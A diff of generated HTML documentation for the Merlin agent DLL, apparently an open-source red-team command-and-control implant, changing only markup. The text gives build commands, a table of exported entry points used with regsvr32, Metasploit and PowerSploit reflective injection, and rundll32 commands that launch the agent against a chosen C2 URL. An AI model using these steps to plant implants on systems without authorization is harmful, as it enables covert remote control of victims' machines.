@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8">
   
@@ -26,10 +26,10 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
-        <script src="../_static/jquery.js"></script>
-        <script src="../_static/underscore.js"></script>
-        <script src="../_static/doctools.js"></script>
-        <script src="../_static/language_data.js"></script>
+        <script type="text/javascript" src="../_static/jquery.js"></script>
+        <script type="text/javascript" src="../_static/underscore.js"></script>
+        <script type="text/javascript" src="../_static/doctools.js"></script>
+        <script type="text/javascript" src="../_static/language_data.js"></script>
     
     <script type="text/javascript" src="../_static/js/theme.js"></script>
 
@@ -203,14 +203,14 @@ Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</spa
 <p>The DLL can be created using the Make file with <code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">agent-dll</span></code></p>
 <p>Alternatively, it can be compiled without Make by following these steps:</p>
 <ul class="simple">
-<li><dl class="simple">
-<dt>Create the required C archive file:</dt><dd><p><code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">data/bin/dll;go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">../../../cmd/merlinagentdll/main.go</span></code></p>
-</dd>
+<li><dl class="first docutils">
+<dt>Create the required C archive file:</dt>
+<dd><code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">data/bin/dll;go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">../../../cmd/merlinagentdll/main.go</span></code></dd>
 </dl>
 </li>
-<li><dl class="simple">
-<dt>Compile the DLL</dt><dd><p><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-shared</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">merlin.dll</span> <span class="pre">merlin.c</span> <span class="pre">main.a</span> <span class="pre">-lwinmm</span> <span class="pre">-lntdll</span> <span class="pre">-lws2_32</span></code></p>
-</dd>
+<li><dl class="first docutils">
+<dt>Compile the DLL</dt>
+<dd><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-shared</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">merlin.dll</span> <span class="pre">merlin.c</span> <span class="pre">main.a</span> <span class="pre">-lwinmm</span> <span class="pre">-lntdll</span> <span class="pre">-lws2_32</span></code></dd>
 </dl>
 </li>
 </ul>
@@ -219,46 +219,46 @@ Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</spa
 <div class="section" id="dll-entry-points">
 <h2>DLL Entry Points<a class="headerlink" href="#dll-entry-points" title="Permalink to this headline">¶</a></h2>
 <p>This table catalogs the exported functions for <code class="docutils literal notranslate"><span class="pre">merlin.dll</span></code> that can be used as an entry point when executing the DLL.</p>
-<table class="colwidths-auto docutils align-default" id="id1">
+<table border="1" class="colwidths-auto docutils" id="id1">
 <caption><span class="caption-text">Exported DLL Functions</span><a class="headerlink" href="#id1" title="Permalink to this table">¶</a></caption>
-<thead>
-<tr class="row-odd"><th class="head"><p>Exported Function</p></th>
-<th class="head"><p>Status</p></th>
-<th class="head"><p>Notes</p></th>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Exported Function</th>
+<th class="head">Status</th>
+<th class="head">Notes</th>
 </tr>
 </thead>
-<tbody>
-<tr class="row-even"><td><p>Run</p></td>
-<td><p>Working</p></td>
-<td><p>Main function to execute Merlin agent</p></td>
+<tbody valign="top">
+<tr class="row-even"><td>Run</td>
+<td>Working</td>
+<td>Main function to execute Merlin agent</td>
 </tr>
-<tr class="row-odd"><td><p>DllInstall</p></td>
-<td><p>Partial</p></td>
-<td><p>Used with regsvr32.exe /i . Handling for <code class="docutils literal notranslate"><span class="pre">/i</span></code> not implemented</p></td>
+<tr class="row-odd"><td>DllInstall</td>
+<td>Partial</td>
+<td>Used with regsvr32.exe /i . Handling for <code class="docutils literal notranslate"><span class="pre">/i</span></code> not implemented</td>
 </tr>
-<tr class="row-even"><td><p>DllRegisterServer</p></td>
-<td><p>Working</p></td>
-<td><p>Used with regsvr32.exe</p></td>
+<tr class="row-even"><td>DllRegisterServer</td>
+<td>Working</td>
+<td>Used with regsvr32.exe</td>
 </tr>
-<tr class="row-odd"><td><p>DllUnregisterServer</p></td>
-<td><p>Working</p></td>
-<td><p>Used with regsvr32.exe /u</p></td>
+<tr class="row-odd"><td>DllUnregisterServer</td>
+<td>Working</td>
+<td>Used with regsvr32.exe /u</td>
 </tr>
-<tr class="row-even"><td><p>ReflectiveLoader</p></td>
-<td><p>Removed</p></td>
-<td><p>Used with Metasploit’s windows/manage/reflective_dll_inject module</p></td>
+<tr class="row-even"><td>ReflectiveLoader</td>
+<td>Removed</td>
+<td>Used with Metasploit’s windows/manage/reflective_dll_inject module</td>
 </tr>
-<tr class="row-odd"><td><p>Magic</p></td>
-<td><p>Working</p></td>
-<td><p>Exported function in <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code>; used with sRDI or any other method</p></td>
+<tr class="row-odd"><td>Magic</td>
+<td>Working</td>
+<td>Exported function in <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code>; used with sRDI or any other method</td>
 </tr>
-<tr class="row-even"><td><p>Merlin</p></td>
-<td><p>Working</p></td>
-<td><p>Exported function in <code class="docutils literal notranslate"><span class="pre">main.go</span></code></p></td>
+<tr class="row-even"><td>Merlin</td>
+<td>Working</td>
+<td>Exported function in <code class="docutils literal notranslate"><span class="pre">main.go</span></code></td>
 </tr>
-<tr class="row-odd"><td><p>VoidFunc</p></td>
-<td><p>Working</p></td>
-<td><p>Used with PowerSploit’s Invoke-ReflectivePEInjection.ps1</p></td>
+<tr class="row-odd"><td>VoidFunc</td>
+<td>Working</td>
+<td>Used with PowerSploit’s Invoke-ReflectivePEInjection.ps1</td>
 </tr>
 </tbody>
 </table>
@@ -267,9 +267,9 @@ Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</spa
 <h2>Execution with rundll32.exe<a class="headerlink" href="#execution-with-rundll32-exe" title="Permalink to this headline">¶</a></h2>
 <p>The DLL can be executed on a Windows host using the rundll32.exe program. Examples of using <code class="docutils literal notranslate"><span class="pre">rundll32</span></code> are:</p>
 <ul class="simple">
-<li><p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span></code></p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Merlin</span></code></p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Magic</span></code></p></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Merlin</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Magic</span></code></li>
 </ul>
 <p>A different Merlin server <em>can</em> be provided when executing the DLL by supplying the target URL as an argument. An example is:</p>
 <p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span> <span class="pre">https://yourdomian.com:443/</span></code></p>
